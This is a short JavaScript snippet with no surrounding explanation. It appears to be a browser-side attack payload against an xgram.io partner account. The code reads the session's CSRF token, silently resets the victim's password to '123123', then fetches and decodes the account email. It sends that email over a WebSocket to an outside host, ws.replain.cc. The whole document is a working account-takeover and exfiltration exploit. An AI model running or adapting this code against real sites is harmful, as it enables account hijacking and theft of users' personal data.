const page = await fetch('https://xgram.io/partner/profile/setting', {
  credentials: 'include'
});
const html = await page.text();
const csrf = html.split('csrf-token" content="')[1].split('"')[0];
await fetch('https://xgram.io/partner/profile/reset-password', {
  credentials: 'include',
  body: `_csrf-frontend=${encodeURIComponent(csrf)}&ResetPasswordForm%5Bpassword%5D=123123&ResetPasswordForm%5Bpassword2%5D=123123`,
  method: 'POST'
});
const encoded = (await fetch('https://xgram.io/partner/profile')).text();
const email = decodeCfEmail(encoded);
const ws = new WebSocket('wss://ws.replain.cc/widget?chatId=demo');
ws.onmessage = () => ws.send(JSON.stringify({ data: { message: email } }));
